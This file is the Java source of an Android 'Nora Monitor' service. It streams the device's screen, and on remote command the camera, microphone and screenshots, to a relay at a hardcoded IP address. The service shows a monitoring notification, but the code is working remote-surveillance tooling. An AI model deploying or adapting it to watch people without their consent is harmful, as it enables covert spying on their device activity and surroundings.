package com.nora.monitor;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.util.DisplayMetrics;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class MonitorService extends Service {

    private static final String TAG       = "MonitorService";
    private static final String CHANNEL   = "nora_monitor";
    private static final int    NOTIF_ID  = 1;

    public static String DEFAULT_RELAY  = "http://16.55.3.205:5000";
    public static String AGENT_SECRET   = "";

    private MediaProjection  mediaProjection;
    private VirtualDisplay   virtualDisplay;
    private ImageReader      imageReader;
    private RelayClient      relay;
    private CameraCapture    cameraCapture;
    private MicCapture       micCapture;
    private volatile boolean streaming = false;
    private Thread           streamThread;

    @Override
    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL, "Nora Monitor", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Notification notif = new NotificationCompat.Builder(this, CHANNEL)
            .setContentTitle("Nora Monitor")
            .setContentText("Monitoring active — tap to open")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build();
        startForeground(NOTIF_ID, notif);

        if (intent == null) return START_STICKY;

        int    resultCode = intent.getIntExtra("resultCode", -1);
        Intent data       = intent.getParcelableExtra("data");

        MediaProjectionManager pm = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        mediaProjection = pm.getMediaProjection(resultCode, data);

        String deviceName = Settings.Global.getString(getContentResolver(), "device_name");
        if (deviceName == null || deviceName.isEmpty()) deviceName = Build.MODEL;

        relay = new RelayClient(this, deviceName, AGENT_SECRET, DEFAULT_RELAY);
        relay.connect();

        startScreenStream();

        cameraCapture = new CameraCapture(this, jpeg -> relay.emitCamera(jpeg));
        micCapture    = new MicCapture(pcm  -> relay.emitAudio(pcm));

        return START_STICKY;
    }

    private void startScreenStream() {
        DisplayMetrics m = getResources().getDisplayMetrics();
        int w = m.widthPixels  / 2;
        int h = m.heightPixels / 2;

        imageReader    = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2);
        virtualDisplay = mediaProjection.createVirtualDisplay(
            "NoraCap", w, h, m.densityDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader.getSurface(), null, null);

        streaming    = true;
        streamThread = new Thread(() -> {
            while (streaming) {
                try {
                    Image img = imageReader.acquireLatestImage();
                    if (img != null) {
                        try {
                            byte[] jpeg = imageToJpeg(img, w, h);
                            relay.emitFrame(jpeg);
                        } finally {
                            img.close();
                        }
                    }
                    Thread.sleep(100); // ~10 fps
                } catch (Exception e) {
                    if (streaming) Log.e(TAG, "stream error", e);
                }
            }
        }, "screen-stream");
        streamThread.setDaemon(true);
        streamThread.start();
    }

    static byte[] imageToJpeg(Image img, int w, int h) {
        Image.Plane[] planes   = img.getPlanes();
        ByteBuffer    buf      = planes[0].getBuffer();
        int           rowStride = planes[0].getRowStride();
        int           pxStride  = planes[0].getPixelStride();

        Bitmap bmp = Bitmap.createBitmap(rowStride / pxStride, h, Bitmap.Config.ARGB_8888);
        bmp.copyPixelsFromBuffer(buf);
        if (rowStride / pxStride != w) {
            Bitmap cropped = Bitmap.createBitmap(bmp, 0, 0, w, h);
            bmp.recycle();
            bmp = cropped;
        }
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bmp.compress(Bitmap.CompressFormat.JPEG, 40, baos);
        bmp.recycle();
        return baos.toByteArray();
    }

    public void startCamera()  { if (cameraCapture != null) cameraCapture.start(); }
    public void stopCamera()   { if (cameraCapture != null) cameraCapture.stop();  }
    public void startMic()     { if (micCapture    != null) micCapture.start();    }
    public void stopMic()      { if (micCapture    != null) micCapture.stop();     }

    public void takeScreenshot(Object[] args) {
        if (imageReader == null) return;
        try {
            Image img = imageReader.acquireLatestImage();
            if (img == null) return;
            try {
                DisplayMetrics m = getResources().getDisplayMetrics();
                int w = m.widthPixels / 2, h = m.heightPixels / 2;
                byte[]     png = imageToJpeg(img, w, h); // close enough for screenshot
                String requester = null;
                if (args != null && args.length > 0)
                    requester = ((JSONObject) args[0]).optString("_requester");
                relay.emitScreenshot(png, requester);
            } finally {
                img.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "screenshot error", e);
        }
    }

    @Override
    public void onDestroy() {
        streaming = false;
        if (virtualDisplay   != null) virtualDisplay.release();
        if (mediaProjection  != null) mediaProjection.stop();
        if (imageReader      != null) imageReader.close();
        if (relay            != null) relay.disconnect();
        if (cameraCapture    != null) cameraCapture.stop();
        if (micCapture       != null) micCapture.stop();
        super.onDestroy();
    }

    @Nullable @Override
    public IBinder onBind(Intent i) { return null; }
}
